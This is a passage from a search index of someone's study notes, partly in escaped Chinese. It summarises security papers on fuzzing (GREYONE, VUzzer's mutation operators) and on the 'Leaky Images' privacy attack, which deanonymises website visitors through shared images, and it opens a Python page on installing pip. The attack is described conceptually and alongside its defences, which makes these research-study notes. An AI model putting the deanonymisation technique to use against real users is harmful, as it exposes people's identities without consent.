VALIDITY \u6d4b\u8bd5\u811a\u672c\u884c\u4e3a\u7684\u4e0d\u786e\u5b9a\u6027\uff1a\u7528sanitizer\u7f13\u89e3\uff0c\u4f9d\u8d56\u7684\u5176\u4ed6\u5e93\u4ee3\u7801\u9700\u8981\u4e5f\u7528\u540c\u6837\u7684\u7f16\u8bd1\uff1btimeout\u673a\u5236\u5f15\u5165\u7684\u8bef\u62a5\uff0c\u53ef\u4ee5\u6539\u53d8\u68c0\u6d4b\u6b7b\u5faa\u73af\u7684\u673a\u5236[20] \u4e0d\u4f9d\u8d56timeout \u6d4b\u8bd5\u6837\u4f8b\u4e0d\u5b8c\u6574may not be exhaustive enough \u4f7f\u7528\u57fa\u4e8e\u8bed\u6cd5\u7684fuzzer \u9759\u6001\u5206\u6790\u5de5\u5177\u7684unsoundness \u4e0d\u652f\u6301\u590d\u6742\u7684\u7279\u6027 \u5982\u590d\u6742\u7684\u6307\u9488\u7b97\u672f\u8ba1\u7b97\uff0c\u672a\u77e5\u8bed\u4e49\u7684API\u8c03\u7528\u5bfc\u81f4\u7684\u590d\u6742\u63a7\u5236\u6d41\u2014\u2014\u7ed3\u5408\u591a\u79cd\u9759\u6001\u5206\u6790\u5de5\u5177</p> <p>\u66f4\u591a\u65b9\u5411</p> <pre><code>program reasoning \u60f3\u77e5\u9053\u662f\u5426\u5f15\u5165\u4e86\u65b0\u7684bug\uff0c\u5305\u62ec\u9759\u6001\u5206\u6790 \u52a8\u6001\u5206\u6790 fuzzing \u8fd0\u884c\u65f6\u76d1\u63a7 \u9a8c\u8bc1\n\u9759\u6001\u5206\u6790\u5de5\u5177\uff1aSparrow [13]\u2014a static analyzer for finding security bugs \u53ef\u4ee5\u68c0\u6d4bbug\uff0c\u8fd8\u80fd\u79fb\u9664\u4e0d\u53ef\u8fbe\u4ee3\u7801\n\u7a0b\u5e8fdebloating \u7c97\u7c92\u5ea6\u7684Docker\u5927\u5bb9\u5668\u62c6\u89e3\u6210\u591a\u4e2a\u5c0f\u5bb9\u5668 \u9700\u8981\u52a8\u6001\u5206\u6790\u5e94\u7528\u884c\u4e3a[35]\n\u66f4\u7ec6\u7c92\u5ea6\u7684\u6709\u505aJava [28]\u548cAndroid [27]\u5e94\u7528\u7684 \uff1b\u6709\u907f\u514d\u8f7d\u5165\u4e0d\u4f1a\u7528\u5230\u7684\u51fd\u6570\u7684[34] \uff08\u51fd\u6570\u7ea7\u522b\u7684\u4f9d\u8d56\u5206\u6790\uff09\n\u53e6\u4e00\u4e2a\u6b63\u4ea4\u7684\u65b9\u5411\uff1a\u68c0\u6d4b\u548c\u51cf\u5c11\u8fd0\u884c\u65f6\u5185\u5b58\u81a8\u80c0 [9,33,40-43]\n\u8f93\u5165\u6837\u4f8b\u7684\u6700\u5c0f\u5316 \u573a\u666f\u662f\u6d4b\u8bd5\u7f16\u8bd1\u5668/\u89e3\u91ca\u5668\uff0c\u4ea7\u751f\u80fdcrash\u7684\u66f4\u5c0f\u7684\u7a0b\u5e8f \u4e0d\u8003\u8651\u5b89\u5168\u6027\u53ef\u8bfb\u6027\n\u6709\u5de5\u4f5c\u8003\u8651\u4e86\u8bed\u6cd5\u7684\u6b63\u786e\u6027[23,32,37] \u4f46\u6ca1\u8003\u8651\u8bed\u4e49\u6b63\u786e\u6027\nProgram slicing \u6307\u5b9a\u4e00\u4e2a\u4f4d\u7f6e\u63d0\u53d6\u7a0b\u5e8f\u7684\u4e00\u5c0f\u90e8\u5206 \u9700\u8981\u6307\u5b9a\u8bed\u4e49\u548c\u4f9d\u8d56\u5173\u7cfb\uff08challenging\uff09\uff0c\u4e5f\u53ef\u80fd\u4e0d\u80fd\u53bb\u6389\u6f0f\u6d1e \uff08\u8fd9\u7bc7\u6587\u7ae0\u7684\u65b9\u6cd5\u66f4\u597d\uff09\n\u9759\u6001\u53ef\u8fbe\u6027\u5206\u6790 \u4e0d\u80fd\u5904\u7406\u590d\u6742\u7684\u63a7\u5236\u6d41\u5982\u95f4\u63a5\u8c03\u7528\u3001\u590d\u6742\u6761\u4ef6\u548c\u6307\u9488\u7b97\u672f\n\u52a8\u6001\u53ef\u8fbe\u6027\u5206\u6790 \u8fd9\u7bc7\u6587\u7ae0\u7684\u65b9\u6cd5\u66f4\u597d\n</code></pre> <p>future work:  more expressive probabilistic models with efficient incremental learning,  designing various forms of specification other than input-output examples, applying to debloat programs written in arbitrary languages such as binary.</p>"},{"location":"PaperReading/#greyone-data-flow-sensitive-fuzzing","title":"GREYONE: Data Flow Sensitive Fuzzing","text":"<p>USENIX20 PDF</p> <p>\u5355\u8bcd:</p> <ul> <li>is labor-intensive and requires lots of manual efforts \u9700\u8981\u4eba\u5de5</li> <li>Head-to-Head Comparison \u6bd4\u8f83\u4e0d\u540c\u7684work</li> <li>to draw conclusions as objective as possible \u5c3d\u53ef\u80fd\u5ba2\u89c2</li> <li>\u9009\u88ab\u6d4b\u7a0b\u5e8f\u7684\u539f\u56e0 We chose target applications considering several factors, including popularity, frequency of being tested, development activeness, and functionality diversity.</li> <li>\u9009\u51fa\u6765\u7684\u7c7b\u522b\u5305\u542b graphics processing libraries (e.g., libcaca and libsixel),</li> <li>shipping with \u7528afl-cmin\u7684\u65f6\u5019\u8bf4the tool afl-cmin shipping with AFL</li> <li>\u786e\u5b9afuzzing\u7684\u65f6\u95f4 we test target applications for more time, until the fuzzers reach a relatively stable state (i.e., the order of fuzzers\u2019 performance does not change anymore).</li> <li>Experiments showed that the fuzzers will get stable after testing these applications for 60 hours. So, we tested each application for 60 hours in our experiment.</li> <li>\u9664\u4e86\u7ed9\u5e73\u5747\u7ed3\u679c \u4e5f\u7ed9\u51famaxinum number</li> <li>a steady and stronger growth trend</li> <li>\u5927\u90e8\u5206\u65b9\u9762\u90fd\u66f4\u5feb in a faster pace than QSYM in most subjects</li> </ul> <p>idea:</p> <p>\u4f7f\u7528\u8f7b\u91cf\u7ea7fuzzing-driven taint inference FTI \u6709\u4e86taint\u4e4b\u540e\u7528\u8f93\u5165\u4f18\u5148\u6a21\u578b\u5224\u65ad\u5148\u63a2\u7d22\u54ea\u4e2a\u8def\u5f84 \u53d8\u5f02\u54ea\u4e9b\u5b57\u8282 \u600e\u4e48\u53d8\u5f02 \u5f3a\u8c03dataflow features\uff1a constraint conformance \u53d8\u91cf\u7684\u503c\u4e0e\u9884\u671f\u503c\u7684\u8ddd\u79bb \u5b9e\u9a8c\u5728\u6700\u65b0\u7684\u8f6f\u4ef6\u4e0a\u8dd1 \u53d1\u73b0\u4e86105\u4e2a\u65b0\u7684bugs\uff0c\u62ff\u5230\u4e8641\u4e2aCVE</p> <p>RQ1: \u600e\u4e48\u505a\u8f7b\u91cf\u51c6\u786e\u7684\u6c61\u70b9\u5206\u6790 FTI\u53d8\u5f02\u8f93\u5165\u6bcf\u4e2a\u5b57\u8282\u770b\u53d8\u91cf\u503c\u7684\u53d8\u5316 \u8f7b\u91cf \u6ca1\u6709over-taint \u7f13\u89e3under-taint(\u53d8\u5f02\u4e0d\u5b8c\u6574\u4f1a\u6709) \u8fd0\u884c\u65f6\u975e\u5e38\u5feb RQ2: \u6709\u4e86taint\u600e\u4e48\u6709\u6548\u6307\u5bfc\u53d8\u5f02 \u9009\u62e9\u5565\u8def\u5f84 \u9009\u62e9\u54ea\u4e9b\u5b57\u8282 \u4f18\u5148\u9009\u62e9\u80fd\u5f71\u54cd\u66f4\u591a\u672a\u5230\u8fbe\u5206\u652f\u7684\u5b57\u8282\uff0c\u4f18\u5148\u4f9d\u8d56\u66f4\u591a\u4f18\u5148\u5b57\u8282\u7684\u5206\u652f RQ3: \u5982\u4f55\u4f7f\u7528\u6570\u636e\u6d41\u7279\u5f81(\u6c61\u70b9\u5c5e\u6027\u548c\u7ea6\u675f\u7b26\u5408\u6027)\u4f18\u5316\u8fdb\u5316\u65b9\u5411conformance-guided evolution \u4f18\u5148\u66f4\u9ad8\u7b26\u5408\u6027\u7684seeds \u80fd\u907f\u514dAngora\u7684\u9677\u5165\u5c40\u90e8\u6700\u4f18\u7684\u95ee\u9898\uff0c\u53e6\u5916\u5c06\u6b63\u5728\u6267\u884c\u7684\u53d8\u5f02rebase\u5230\u66f4\u597d\u7684seeds\u53ef\u4ee5\u663e\u8457\u4f18\u5316\u901f\u5ea6</p> <p>\u7b26\u53f7\u6267\u884c\u4e0d\u80fd\u5904\u7406\u5927\u7a0b\u5e8f\uff0c\u4e0d\u80fd\u89e3\u51b3\u590d\u6742\u7684\u7ea6\u675f\u5982on-way functions \u4f20\u7edf\u7684\u52a8\u6001\u6c61\u70b9\u5206\u6790 \u9700\u8981\u5927\u91cf\u52b3\u52a8\u4eba\u7c7b\u5de5\u4f5c, \u4e0d\u51c6\u786e undertaint\u7684\u95ee\u9898 \u4e0d\u80fd\u5904\u7406\u9690\u5f0f\u6570\u636e\u6d41\uff0c\u975e\u5e38\u6162</p> <p>\u4e0d\u7b26\u5408non-intererence rule[16]\u7684\u5c31\u6709\u4f9d\u8d56\u5173\u7cfb FTI\u53d8\u5f02\u7684\u65f6\u5019\u662f\u4f7f\u7528\u9884\u5148\u5b9a\u4e49\u7684\u53d8\u5f02\u89c4\u5219 \u5982\u5355\u4f4d\u7ffb\u8f6c\u3001\u591a\u4f4d\u7ffb\u8f6c\u548c\u7b97\u672f\u64cd\u4f5c\uff0c\u4e0d\u80fd\u4fdd\u8bc1\u5b8c\u5168\u53d8\u5f02 \u53d8\u91cf\u503c\u8ffd\u8e2a\u662f\u63d2\u4ee3\u7801 special value tracking code \u53ea\u5173\u6ce8\u4e0e\u8def\u5f84\u7ea6\u675f\u6709\u5173\u7684\u53d8\u91cf\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u51fa\u503c\u548c\u5bf9\u5e94\u7684\u8f93\u5165\u5b57\u8282\u6bd4\u8f83 \u4e00\u81f4\u5c31\u662fdirect copy</p> <p>\u8f93\u5165\u5b57\u8282\u7684\u6743\u91cd\u662f\u5b83\u5f71\u54cd\u7684\u672a\u5230\u8fbe\u7684\u5206\u652f\u6570\u91cf\uff0c\u4e00\u4e2a\u672a\u5230\u8fbe\u5206\u652f\u7684\u6743\u91cd\u662f\u5b83\u4f9d\u8d56\u7684\u6240\u6709\u5b57\u8282\u6743\u91cd\u7684\u548c</p> <p>\u53d8\u5f02\u54ea\u4e2a\u4f4d\u7f6e\uff1f\u627e\u5f53\u524dseed\u672a\u8986\u76d6\u7684\u9644\u8fd1\u7684\u5206\u652f \u6309\u5206\u652f\u6743\u91cd\u5012\u5e8f\uff1b\u5bf9\u4e8e\u4e00\u4e2a\u5206\u652f\u4f9d\u8d56\u7684\u591a\u4e2a\u5b57\u8282\uff0c\u6309\u5b57\u8282\u7684\u6743\u91cd\u5012\u5e8f \u600e\u4e48\u53d8\u5f02\uff1fdirect copy\u5982\u679c\u9700\u8981\u8ddf\u4e00\u4e2a\u8fd0\u884c\u65f6\u7b97\u51fa\u7684checksum\u76f8\u7b49 \u5148\u5f97\u5230\u8fd0\u884c\u65f6\u9700\u8981\u7684\u503c\uff0c\u518d\u4f7f\u7528\u8fd9\u4e2a\u503c\u548c\u5fae\u5c0f\u53d8\u5f02\u6765\u4fee\u590d\u5bf9\u5e94\u7684\u8f93\u5165\u5b57\u8282 \u53ef\u4ee5\u76f4\u63a5\u77e5\u9053\u5e94\u8be5\u4fee\u6539\u54ea\u4e2aoffset \u9700\u8981\u4ec0\u4e48\u503c indirect copies\u5c31\u968f\u673a\u53d8\u5f02 \u53ef\u4ee5\u4e00\u6b21\u53d8\u5f02\u591a\u4e2a\u5b57\u8282  \u7f13\u89e3undertaint \u9664\u4e86\u4f9d\u8d56\u7684\u5b57\u8282 \u4e5f\u4ee5\u4e00\u4e2a\u8f83\u4f4e\u7684\u6982\u7387\u53d8\u5f02\u90bb\u5c45\u5b57\u8282</p> <p>\u8ba1\u7b97\u7b26\u5408\u6027 \u5bf9\u4e8e\u672a\u5230\u8fbe\u7684\u5206\u652f \u5b9a\u4e49\u662f\u4e24\u4e2a\u6bd4\u8f83\u7684\u503c\u4e4b\u95f4\u6709\u591a\u5c11bit\u4e00\u81f4\uff0c \u5bf9\u4e8e\u4e00\u4e2a\u5df2\u7ecf\u5230\u8fbe\u57fa\u672c\u5757 \u5b9a\u4e49\u662f\u5176\u6240\u6709\u672a\u5230\u8fbe\u90bb\u5c45\u7684\u7b26\u5408\u6027\u7684\u6700\u5927\u503c\uff0c \u5bf9\u4e8e\u4e00\u4e2aseed \u5b9a\u4e49\u662f\u8986\u76d6\u7684\u6240\u6709\u57fa\u672c\u5757\u7684\u7b26\u5408\u6027\u7684\u7d2f\u52a0</p> <p>seed queue\u65b0\u7684\u7ed3\u6784 \u5728\u76f8\u540ccoverage \u53d1\u73b0\u66f4\u9ad8\u5206\u6570\u7684seed\u7684\u65f6\u5019 \u66ff\u6362\uff1b\u5728\u53d1\u73b0\u76f8\u540ccoverage \u76f8\u540c\u5206\u6570 \u4f46\u57fa\u672c\u5757conformance\u7684\u5206\u5e03\u4e0d\u540c\u7684\u65f6\u5019\uff0c\u52a0\u5165\u7684\u8fd9\u4e2aNode\u6570\u7ec4</p> <p>\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4e0e\u68af\u5ea6\u4e0b\u964d\u76f8\u5f53\uff0c\u8fd8\u80fd\u907f\u514dAngora\u7684\u9677\u5165\u5c40\u90e8\u6700\u4f18\u7684\u95ee\u9898 \u5728\u66ff\u6362seed\u540e \u540e\u7eed\u5bf9\u8fd9\u4e2aseed\u7684\u4f7f\u7528\u4e5f\u7acb\u523b\u6362\u6210\u65b0\u7684seed \u8fd9\u6837\u53ef\u4ee5\u5728LAVA\u6570\u636e\u96c6\u4e0a\u5feb3\u500d</p> <p>\u9009seed\u7684\u65f6\u5019 \u7ed9\u9ad8\u5206\u6570\u7684\u66f4\u9ad8\u6743\u91cd</p> <p>selective testing \u76f8\u6bd4AFL\u7684coverage tracking\u591a\u4e86\u4e24\u4e2a\u6a21\u5f0f\uff1aFTI\u53d8\u91cf\u503c\u76d1\u6d4b\uff0c\u8fdb\u5316\u4f18\u5316\u7b97conformance\u5206\u6570 \u5f53conformance\u4e00\u6bb5\u65f6\u95f4\u4e0d\u589e\u52a0\u4e86\u5c31\u5207\u56deAFL\u7684\u6a21\u5f0f \u63d0\u9ad8\u8fd0\u884c\u901f\u5ea6</p> <p>conformance\u8ba1\u7b97\u7528\u7684by operations like __builtin_popcount FTI\u7528\u5230\u7684\u503c\u76d1\u6d4b \u7528\u7684bitmap\u7684\u7ed3\u679c \u7ed9\u6bcf\u4e2a\u53d8\u91cf\u4e00\u4e2a\u5168\u5c40\u552f\u4e00\u7684ID</p> <p>LAVA-M\u9664\u4e86who\u4e5f\u6709unlisted bugs?</p> <p>\u66f4\u6df1\u5165\u7684\u5206\u6790\uff1a FTI\u7684under taint\u95ee\u9898 FTI\u6709\u6ca1\u6709\u7528\uff1f \u5b9e\u73b0\u4e00\u4e2a\u57fa\u4e8eDTA\u7684\u955c\u50cf\u6bd4\u8f83 \u5404\u4e2a\u4e0d\u540c\u90e8\u5206\u5bf9\u7ed3\u679c\u7684\u8d21\u732e \u53bb\u6389\u4f18\u5148\u7b56\u7565\uff0c\u53bb\u6389conformance\u8fdb\u5316 \u4e09\u8005\u6bd4\u8f83 selective fuzzing \u6bd4\u8f83\u6267\u884c\u901f\u5ea6</p> <p>\u5176\u4ed6Paper:</p> <pre><code>DigFuzz[45] \u7528\u4e86\u7b26\u53f7\u6267\u884c \u6982\u7387\u8def\u5f84\u4f18\u5148\u6a21\u578b\nTaintInduce[46]\u53ef\u4ee5\u81ea\u52a8\u63a8\u6d4b\u51fapropagation rules\nProFuzzer[42]\u4e5f\u662f\u4e00\u6b21\u53d8\u5f02\u4e00\u4e2a\u5b57\u8282 \u4f46\u53ea\u5173\u6ce8coverage\u53d8\u5316 \u4e0d\u80fd\u63a8\u65ad\u51fa\u6c61\u70b9\u7684\u4f9d\u8d56\u5173\u7cfb \u548cFairFuzz[24]\u90fd\u80fd\u63a8\u65adpartial type of mutated bytes \u4f46\u5bf9\u8fd9\u4e2a\u5206\u652f\u662f\u5426\u5df2\u7ecf\u5230\u8fc7\u662finsensitive\u7684\nMutaFlow[26] \u76d1\u6d4bsink APIs\u7684\u53d8\u5316 \u53c2\u6570\u662f\u5426\u88abtainted\nREDQUEEN[4] \u80fd\u5904\u7406direct copy\u4f46\u4e0d\u80fd\u627e\u5230\u7cbe\u786e\u7684\u4f4d\u7f6e \u9700\u8981\u767e\u6b21\u8fd0\u884c\u6765\u83b7\u5f97a colorized version with higher entropy \u518d\u6d4b\u4e00\u904d\u83b7\u5f97\u4f4d\u7f6e \u6574\u4e2a\u8fc7\u7a0b\u592a\u6162\nIntel-laf[1] \u5c06\u957f\u7684\u6bd4\u8f83\u5206\u5272\u6210\u77ed\u7684\u6bd4\u8f83 \u4f46\u662f\u5e26\u6765\u66f4\u591a\u8bed\u4e49\u76f8\u540c\u7684\u8def\u5f84 \u4e0d\u80fd\u5904\u7406\u975e\u5e38\u91cf\u6bd4\u8f83\nSYMFUZZ[8] \u53ef\u4ee5\u68c0\u6d4binput bits\u4e4b\u95f4\u7684\u4f9d\u8d56 \u8ba1\u7b97\u51faoptimal mutation ratio\n</code></pre>"},{"location":"PaperReading/#vuzzer","title":"VUzzer\u7684\u53d8\u5f02\u64cd\u4f5c","text":"<p>https://github.com/vusec/vuzzer/blob/f6f7d593a0e76e86afb3c7af6d5186f897bab979/operators.py#L291</p> <p>\u8fd9\u91cc\u6211\u4eec\u5206\u6790\u4e00\u4e0bvuzzer\u5b9e\u73b0\u7684\u53d8\u5f02\u64cd\u4f5c\uff0c\u5176\u6240\u6709operators\u4e3a\u4e00\u4e2a\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2a\u51fd\u6570</p> <p>\u540c\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u51fa\u73b0\u591a\u6b21\uff0c\u6392\u5e8f\u540e\u5982\u4e0b\u6240\u793a\uff0c\u6211\u6309\u7167\u6211\u7684\u7406\u89e3\u6807\u6ce8\u4e86\u529f\u80fd\uff1a</p> <pre><code>add_random \u9009\u62e9\u4e00\u4e2a\u968f\u673a\u4f4d\u7f6e \u63d2\u5165\u968f\u673a\u5b57\u7b26\u4e32\nadd_random\nadd_random\nchange_bytes \u6839\u636eTAINTMAP\u4fee\u6539\nchange_bytes\nchange_random \u9009\u62e9\u4e00\u90e8\u5206\u5b57\u8282\u66ff\u6362\u4e3a\u968f\u673a\u5b57\u7b26\u4e32\nchange_random\nchange_random_full \u9009\u62e9\u4e00\u90e8\u5206\u5b57\u8282\u66ff\u6362\u4e3a\u968f\u673a\u5b57\u7b26\u4e32\u6216\u4ece\u7a0b\u5e8f\u4e2d\u63d0\u53d6\u51fa\u7684magic bytes\nchange_random_full\ndouble_fuzz \u968f\u673a\u9009\u62e9\u4e24\u79cdmutator\neliminate_double_null \u5220\u53bb\\0\\0\neliminate_null \u5c06\\0\u66ff\u6362\u4e3aA\neliminate_random \u968f\u673a\u5220\u53bb\u4e00\u90e8\u5206\neliminate_random\nint_slide \u5c06\u7279\u5b9a\u4f4d\u7f6e\u53d8\u4e3a \\xFF\\xFF\\xFF\\xFF \u6216 \\x80\\x00\\x00\\x00 \u6216 \\x00\\x00\\x00\\x00\nlower_single_random \u968f\u673a\u53d8\u5f021~100\u6b21\uff1a\u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u53d8\u4e3a\u5176-1\nraise_single_random \u968f\u673a\u53d8\u5f021~100\u6b21\uff1a\u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u53d8\u4e3a\u5176+1\nsingle_change_random \u968f\u673a\u53d8\u5f021~100\u6b21\uff1a\u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u53d8\u4e3a\u968f\u673a\u5b57\u7b26\ntotally_random \u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u5728100~1000\u7684\u5b57\u7b26\u4e32\n</code></pre>"},{"location":"PaperReading/#leaky-images-targeted-privacy-attacks-in-the-web","title":"Leaky Images: Targeted Privacy Attacks in the Web","text":"<p>Usenix19 PDF</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u77e5\u9053\u7528\u6237\u5728google,onedrive,dropbox\u7684\u767b\u5f55\u8eab\u4efd\uff0c\u901a\u8fc7\u7279\u5b9a\u5206\u4eab\u4e00\u4e2a\u56fe\u7247\u770b\u80fd\u5426\u6210\u529f\u52a0\u8f7d</p> <p>\u5728intro\u91cc\u5c31\u7ed9\u51fa\u4e00\u4e2a\u5438\u5f15\u4eba\u7684\u4f8b\u5b50\uff1a\u7528\u6765\u53bb\u533f\u540d\u5316\u5ba1\u7a3f\u4eba\u2014\u2014\u6536\u96c6\u6240\u6709committe\u7684\u90ae\u7bb1\u5206\u4eab\u56fe\u7247\uff0c\u8bba\u6587\u4e2d\u7ed9\u4e2a\u653b\u51fb\u8005\u7f51\u7ad9\u7684\u94fe\u63a5</p> <p>\u8868\u683c1\u6bd4\u8f83\u76f8\u5173\u7684\u653b\u51fb\uff1a\u8ffd\u8e2a\u50cf\u7d20\u3001\u793e\u4ea4\u5a92\u4f53\u6307\u7eb9\uff08\u662f\u5426\u767b\u5f55\uff09\u3001CSRF\uff08\u6709\u526f\u4f5c\u7528\uff09\u3001\u672c\u6587Leaky images</p> <p>\u6bd4\u8f83\uff1a\u8c01\u80fd\u653b\u51fb\uff1f \u653b\u51fb\u8005\u80fd\u5b9e\u73b0\u5565\uff1f \u7528\u9014\u573a\u666f</p> <p>\u6240\u6709\u7f51\u7ad9\u90fd\u80fd\u53d1\u8d77\u653b\u51fb\uff0c\u53ef\u4ee5\u51c6\u786e\u627e\u51fa\u53d7\u5bb3\u8005\uff0c\u5b9a\u5411\u7684fine-grained\u53bb\u533f\u540d\u5316</p> <p>\u7814\u7a76\u4e86250\u4e2a\u6700\u6d41\u884c\u7f51\u7ad9\u768430\u4e2a \u627e\u52308\u4e2a\u7f51\u7ad9\u6709\u6f0f\u6d1e \u624b\u5de5\u627e \u5171\u4eab\u7684\u56fe\u7247\u80fd\u901a\u8fc7\u4e00\u4e2alink\u52a0\u8f7d \u4e14\u53ea\u6709\u7279\u5b9a\u7528\u6237\u80fd\u8bbf\u95ee\uff08\u57fa\u4e8ecookie\u7684\u8bbf\u95ee\u63a7\u5236\uff09</p> <p>\u8d21\u732e\uff1a</p> <ul> <li>\u65b0\u7684\u653b\u51fb \u5b9a\u5411\u9690\u79c1\u653b\u51fb\u6ee5\u7528\u56fe\u7247\u5171\u4eab\u670d\u52a1\u6765\u786e\u5b9a\u53d7\u5bb3\u8005\u662f\u5426\u6b63\u5728\u8bbf\u95ee\u653b\u51fb\u8005\u7684\u7f51\u7ad9</li> <li>\u8ba8\u8bba\u4e86\u653b\u51fb\u7684\u5404\u4e2a\u53d8\u79cd \u53ef\u4ee5\u653b\u51fbaim at\u5355\u4e2a\u7528\u6237 \u4e00\u7fa4\u7528\u6237 \u4e0d\u540c\u670d\u52a1\u4e4b\u95f4link\u7528\u6237 \u4ee5\u53ca\u4e0d\u9700\u8981js\u7684</li> <li>\u5c55\u793a8\u4e2a\u6d41\u884c\u7f51\u7ad9\u5b58\u5728\u95ee\u9898 \u8ba9\u7b2c\u4e09\u65b9\u7f51\u7ad9\u80fd\u5b9a\u4f4d\u4ed6\u4eec\u7684\u7528\u6237</li> <li>\u63d0\u51fa\u591a\u79cd\u7f13\u89e3\u95ee\u9898\u7684\u65b9\u6848\u5e76\u8ba8\u8bba\u4f18\u7f3a\u70b9</li> </ul> <p>Table2 shows a two-dimensional matrix \u6839\u636e\u662f\u5426\u9274\u6743+URL\u662f\u516c\u5f00\u3001\u4e0d\u540c\u7528\u6237\u76f8\u540c\u3001\u4e0d\u540c\u7528\u6237\u4e0d\u540c\u6765\u533a\u5206\uff0c\u53ea\u6709\u9700\u8981\u9274\u6743+\u516c\u5f00url \u548c \u9700\u8981\u9274\u6743+url\u5bf9\u653b\u51fb\u8005\u53ef\u77e5 \u624d\u80fd\u505aLeaky image\u653b\u51fb</p> <p>\u8ba8\u8bba\u90e8\u5206\uff1a\u5728\u65b9\u6cd5\u4e00\u8282\u4e2d\u5c31\u8ba8\u8bbarelated work\uff0c\u6bd4\u8f83\u8ffd\u8e2a\u50cf\u7d20\u3001\u6307\u7eb9\u3001\u5b9a\u5411\u653b\u51fbvs\u5927\u89c4\u6a21\u8ffd\u8e2a\u3002\u5b9a\u5411\u653b\u51fb\u636e\u8bf4\u5bf9\u9ad8\u4ef7\u503c\u53d7\u5bb3\u8005\u8d8a\u6765\u8d8a\u6d41\u884c[37]</p> <p>\u73b0\u5b9emeasurement\u7684\u8ba8\u8bba Our study of \u2026 in real-world sites enables several observations.</p> <ul> <li>Leaky images\u662f\u666e\u904d\u7684 prevalent</li> <li>\u53d7\u5bb3\u8005\u751a\u81f3\u4e0d\u4f1a\u6ce8\u610f\u5230\u88ab\u5171\u4eab\u4e86\u4e00\u4e2a\u56fe\u7247</li> <li>\u53d7\u5bb3\u8005\u4e0d\u80fdunshare</li> <li>\u56fe\u7247\u5171\u4eab\u670d\u52a1\u4f7f\u7528\u4e86\u591a\u79cd\u5b9e\u73b0\u7b56\u7565\u7684\u6df7\u5408 use a diverse mix of implementation strategies</li> <li>\u4e0d\u540c\u7f51\u7ad9\u653b\u51fb\u9762\u4e0d\u540c varies from site to site</li> </ul> <p>\u8868\u8fbe\uff1a</p> <p>\u4ec5\u4ec5\u9700\u8981 involve nothing more than \u2026</p> <p>\u8bc1\u660e\u73b0\u5b9e\u5b58\u5728\u80fd\u5f71\u54cd\u4eca\u5929\u6700\u6d41\u884c\u7f51\u7ad9 Section 4 shows that these cases occur in practice, and that they affect some of today\u2019s most popular websites.</p> <p>\u4e3a\u4e86\u7406\u89e3\u6700\u6d41\u884c\u7f51\u7ad9\u53d7\u5f71\u54cd\u7684\u7a0b\u5ea6 To understand to what extent popular websites are affected by the privacy problem discussed in this paper</p> <p>\u7b2c\u4e00\u4e14\u6700\u91cd\u8981\u7684The first and perhaps most important observation is that \u2026</p> <p>\u5e0c\u671b\u80fd\u4fc3\u8fdb\u4ee5\u540e\u66f4\u81ea\u52a8\u5316\u7684\u7814\u7a76 We hope that our results will spur future work on more automated analyses that identify leaky images</p> <p>\u8ba8\u8bba\u6bcf\u4e2a\u89e3\u51b3\u65b9\u6848\u4e0d\u8db3</p> <p>The drawback of this fix is that \u2026</p> <p>On the downside, implementing this defense may \u2026</p> <p>However, this mitigation cannot defend against \u2026</p> <p>require the developers to be aware of the vulnerability in the first place. \u4e8b\u5148\u5c31\u77e5\u9053\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u5b58\u5728</p> <p>\u548cGDPR\u5f88\u642d\uff0c\u8981\u6c42\u8bbe\u8ba1\u4e0a\u9ed8\u8ba4\u4fdd\u62a4 would be in the spirit of the newly adopted European Union\u2019s Genearl Data Protection Regulation which requires data protection by design and by default.</p> <p>\u9700\u8981\u66f4\u591a\u7814\u7a76\u6765\u6df1\u5165\u5206\u6790\u53ef\u7528\u6027+\u517c\u5bb9\u6027+\u90e8\u7f72\u5f00\u9500\uff0cto aid the browser vendors to take an informed decision, future work should perform an in-depth analysis of all these defenses in terms of usability, compatibility and deployment cost, in the style of \u2026 [9], and possibly propose additional solutions.</p> <p>\u8865\u5145\u4e86\u4e00\u79cd\u65b0\u7684\u653b\u51fbLeaky images adds a privacy-related attack to the set of existing targeted attacks.</p> <p>\u5382\u5546\u4fee\u590d\u8bf4\u660e\u95ee\u9898\u5f88\u91cd\u8981 This feedback shows that the problem we identified is important to practitioners.</p> <p>\u6211\u4eec\u7684\u8bba\u6587\u5e2e\u52a9\u63d0\u9ad8\u5f00\u53d1\u8005\u548c\u7814\u7a76\u8005\u7684\u610f\u8bc6\u4ee5\u540e\u907f\u514d\u8fd9\u4e2a\u95ee\u9898 Our paper helps raising awareness among developers and researchers to avoid this privacy issue in the future.</p> <p>\u6280\u672f\uff1a</p> <p>\u4e0d\u7528onload\u4e5f\u53ef\u4ee5\u53bb\u68c0\u67e5\u5df2\u7ecf\u52a0\u8f7d\u7684\u56fe\u7247\u7684\u5bbd\u9ad8</p> <p>\u7528"},{"location":"Python/","title":"Python","text":"<p>\u55ef\u54fc\uff0cPython\u5f88\u597d\u73a9\u5462\u2026\u6709\u4eba\u8bf4Python\u662f\u80fd\u8fd0\u884c\u7684\u4f2a\u4ee3\u7801\uff0c\u5c31\u5199\u4ee3\u7801\u7684\u901f\u5ea6\u800c\u8a00\u662f\u663e\u8457\u4f18\u4e8eC\u7684\uff0c\u4e5f\u6709\u5f88\u591a\u597d\u7528\u7684\u7c7b\u5e93\u5462\uff0c\u53cd\u6b63\u5f3a\u70c8\u63a8\u8350\u8fd9\u95e8\u8bed\u8a00\u5566~</p> <p>\u5f53\u4f60\u5c1d\u8bd5\u4e00\u4e2a\u5305\u7684\u65f6\u5019\uff0c\u6ce8\u610f\u81ea\u5df1\u7684py\u6587\u4ef6\u540d\u79f0\u4e0d\u80fd\u4e0e\u5305\u540d\u91cd\u540d\uff0c\u4f8b\u5982\u4e0d\u8981\u51fa\u73b0flask.py</p>"},{"location":"Python/#pip","title":"\u5b89\u88c5pip","text":"<pre><code>curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py\npython get-pip.py\n</code></pre>"},{"location":"Python/#pip-mirrorsaliyuncom","title":"\u8bbe\u7f6epip\u6e90 - 